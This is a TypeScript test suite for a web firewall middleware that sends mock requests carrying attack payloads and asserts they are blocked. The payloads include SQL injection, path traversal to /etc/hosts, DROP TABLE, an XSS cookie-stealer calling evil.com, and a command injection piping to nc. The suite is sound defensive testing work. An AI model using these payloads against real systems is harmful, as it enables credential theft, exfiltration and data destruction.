import { wafShield } from '../src/middleware/wafShield.js';
import { ThreatIntelligence } from '../src/services/threatIntelligence.js';
import { CircuitBreaker } from '../src/services/circuitBreaker.js';
import { CacheService } from '../src/services/cacheService.js';

interface MockResponse {
  statusCode: number;
  body: any;
  status: (code: number) => MockResponse;
  json: (data: any) => MockResponse;
}

function createMockRes(): MockResponse {
  const res: MockResponse = {
    statusCode: 200,
    body: null,
    status(code: number) {
      this.statusCode = code;
      return this;
    },
    json(data: any) {
      this.body = data;
      return this;
    },
  };
  return res;
}

let passedTests = 0;
let failedTests = 0;

function assert(condition: boolean, testName: string, detail?: string) {
  if (condition) {
    console.log(`  ✅ [PASSED] ${testName}`);
    passedTests++;
  } else {
    console.error(`  ❌ [FAILED] ${testName}: ${detail || ''}`);
    failedTests++;
  }
}

async function runAttackSuite() {
  console.log('\n======================================================');
  console.log('   BEDROCK MULTI-VECTOR ATTACK & WAF RESILIENCE SUITE   ');
  console.log('======================================================\n');

  // Test 1: SQL Injection Detection
  console.log('1. Testing SQL Injection (SQLi) Defense...');
  {
    const req: any = {
      ip: '198.51.100.10',
      headers: { 'user-agent': 'Mozilla/5.0' },
      originalUrl: '/api/prompts?filter=active',
      query: { q: "' UNION ALL SELECT username, password FROM users --" },
      params: {},
      body: {},
    };
    const res = createMockRes();
    let calledNext = false;
    wafShield(req, res, () => { calledNext = true; });

    assert(res.statusCode === 400 && res.body?.code === 'SQL_INJECTION_BLOCKED', 'Blocks UNION SELECT attack', `Status: ${res.statusCode}, Body: ${JSON.stringify(res.body)}`);
    assert(!calledNext, 'Execution halted before next() middleware');
  }

  // Test 2: Cross-Site Scripting (XSS) Detection
  console.log('\n2. Testing Cross-Site Scripting (XSS) Defense...');
  {
    const req: any = {
      ip: '198.51.100.11',
      headers: { 'user-agent': 'Mozilla/5.0' },
      originalUrl: '/api/prompts',
      query: {},
      params: {},
      body: { title: 'Harmless Name', prompt: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>' },
    };
    const res = createMockRes();
    let calledNext = false;
    wafShield(req, res, () => { calledNext = true; });

    assert(res.statusCode === 400 && res.body?.code === 'XSS_INJECTION_BLOCKED', 'Blocks <script> XSS payload', `Status: ${res.statusCode}, Body: ${JSON.stringify(res.body)}`);
    assert(!calledNext, 'Halt execution on XSS injection');
  }

  // Test 3: Path Traversal & LFI Detection
  console.log('\n3. Testing Path Traversal & LFI Defense...');
  {
    const req: any = {
      ip: '198.51.100.12',
      headers: { 'user-agent': 'Mozilla/5.0' },
      originalUrl: '/api/workflows?file=../../../../etc/hosts',
      query: { file: '../../../../etc/hosts' },
      params: {},
      body: {},
    };
    const res = createMockRes();
    let calledNext = false;
    wafShield(req, res, () => { calledNext = true; });

    assert(res.statusCode === 400 && res.body?.code === 'TRAVERSAL_ATTEMPT_BLOCKED', 'Blocks ../../../../etc/hosts traversal', `Status: ${res.statusCode}, Code: ${res.body?.code}`);
    assert(!calledNext, 'Halt execution on Path Traversal');
  }

  // Test 4: Command Injection / Remote Code Execution (RCE)
  console.log('\n4. Testing Remote Code Execution (RCE) Defense...');
  {
    const req: any = {
      ip: '198.51.100.13',
      headers: { 'user-agent': 'Mozilla/5.0' },
      originalUrl: '/api/user/generate-key',
      query: {},
      params: {},
      body: { label: 'my-key; whoami | nc 10.0.0.1 4444' },
    };
    const res = createMockRes();
    let calledNext = false;
    wafShield(req, res, () => { calledNext = true; });

    assert(res.statusCode === 400 && res.body?.code === 'COMMAND_INJECTION_BLOCKED', 'Blocks shell command separator execution', `Status: ${res.statusCode}, Code: ${res.body?.code}`);
    assert(!calledNext, 'Halt execution on RCE sequence');
  }

  // Test 5: Automated Scanner Fingerprinting
  console.log('\n5. Testing Scanner / Bot Fingerprint Defense...');
  {
    const req: any = {
      ip: '198.51.100.14',
      headers: { 'user-agent': 'sqlmap/1.7.2#stable (https://sqlmap.org)' },
      originalUrl: '/api/prompts',
      query: {},
      params: {},
      body: {},
    };
    const res = createMockRes();
    let calledNext = false;
    wafShield(req, res, () => { calledNext = true; });

    assert(res.statusCode === 403 && res.body?.code === 'AUTOMATED_SCANNER_BLOCKED', 'Rejects sqlmap reconnaissance signature', `Status: ${res.statusCode}`);
    assert(!calledNext, 'Halt execution on vulnerability scanner');
  }

  // Test 6: Honeypot & Sensitive Path Probing
  console.log('\n6. Testing Honeypot & Sensitive Path Probe Defense...');
  {
    const req: any = {
      ip: '198.51.100.15',
      headers: { 'user-agent': 'Mozilla/5.0' },
      originalUrl: '/.env',
      query: {},
      params: {},
      body: {},
    };
    const res = createMockRes();
    let calledNext = false;
    wafShield(req, res, () => { calledNext = true; });

    assert(res.statusCode === 404 || res.statusCode === 403, 'Traps probe for .env credential files', `Status: ${res.statusCode}`);
    assert(!calledNext, 'Halt execution on honeypot probe');
  }

  // Test 7: Prototype Pollution Attack
  console.log('\n7. Testing Prototype Pollution Defense...');
  {
    const req: any = {
      ip: '198.51.100.16',
      headers: { 'user-agent': 'Mozilla/5.0' },
      originalUrl: '/api/prompts',
      query: {},
      params: {},
      body: JSON.parse('{"__proto__": {"isAdmin": true}}'),
    };
    const res = createMockRes();
    let calledNext = false;
    wafShield(req, res, () => { calledNext = true; });

    assert(res.statusCode === 400 && res.body?.code === 'PAYLOAD_MALFORMED', 'Rejects __proto__ manipulation attempt', `Status: ${res.statusCode}, Code: ${res.body?.code}`);
    assert(!calledNext, 'Halt execution on Prototype Pollution');
  }

  // Test 8: Threat Intelligence Jailing System
  console.log('\n8. Testing Automated IP Jailing Mechanism...');
  {
    const attackerIp = '203.0.113.99';
    // Send 2 high-severity attacks to accumulate >=100 threat points
    const req1: any = {
      ip: attackerIp,
      headers: { 'user-agent': 'Mozilla/5.0' },
      originalUrl: '/api/prompts?q=1; DROP TABLE users',
      query: { q: '1; DROP TABLE users' },
      params: {},
      body: {},
    };
    const res1 = createMockRes();
    wafShield(req1, res1, () => {});

    const req2: any = {
      ip: attackerIp,
      headers: { 'user-agent': 'Mozilla/5.0' },
      originalUrl: '/api/auth/login',
      query: {},
      params: {},
      body: { email: 'admin@test.com; whoami' },
    };
    const res2 = createMockRes();
    wafShield(req2, res2, () => {});

    // Third request: Even a completely benign request should be blocked immediately with 403 because IP is jailed
    const req3: any = {
      ip: attackerIp,
      headers: { 'user-agent': 'Mozilla/5.0' },
      originalUrl: '/api/health',
      query: {},
      params: {},
      body: {},
    };
    const res3 = createMockRes();
    wafShield(req3, res3, () => {});

    assert(res3.statusCode === 403 && res3.body?.code === 'ACCESS_RESTRICTED', 'Jailed IP is rejected on all endpoints', `Status: ${res3.statusCode}, Body: ${JSON.stringify(res3.body)}`);
  }

  // Test 9: Circuit Breaker State Transition & Failover
  console.log('\n9. Testing AI Provider Circuit Breaker Resilience...');
  {
    const testProvider = 'test_groq_resilience';
    assert(CircuitBreaker.canAttempt(testProvider) === true, 'Initial circuit state is healthy (CLOSED)');

    // Simulate 3 consecutive provider failures
    CircuitBreaker.recordFailure(testProvider, 'Connection Timeout 504');
    CircuitBreaker.recordFailure(testProvider, 'Rate Limit 429');
    const { tripped } = CircuitBreaker.recordFailure(testProvider, 'Service Unavailable 503');

    assert(tripped === true, 'Circuit tripped to OPEN state after 3 failures');
    assert(CircuitBreaker.canAttempt(testProvider) === false, 'Blocked from wasting time on dead provider (fails fast to backup)');

    // Reset circuit
    CircuitBreaker.reset(testProvider);
    assert(CircuitBreaker.canAttempt(testProvider) === true, 'Circuit can be restored or recovered');
  }

  // Test 10: In-Memory Response Caching & Semantic Hash
  console.log('\n10. Testing Sub-15ms Response Hash Caching...');
  {
    const key = CacheService.generatePromptHash('gpt-4o', 'Summarize architecture', { temp: 0.5 });
    CacheService.set(key, 'Cached Architecture Summary Output', 60000);

    const cached = CacheService.get<string>(key);
    assert(cached === 'Cached Architecture Summary Output', 'Retrieved exact cached response instantly');
  }

  console.log('\n======================================================');
  console.log(`Results: ${passedTests} Passed, ${failedTests} Failed`);
  console.log('======================================================\n');

  if (failedTests > 0) {
    process.exit(1);
  }
}

runAttackSuite().catch((err) => {
  console.error('[FATAL] Attack suite execution error:', err);
  process.exit(1);
});
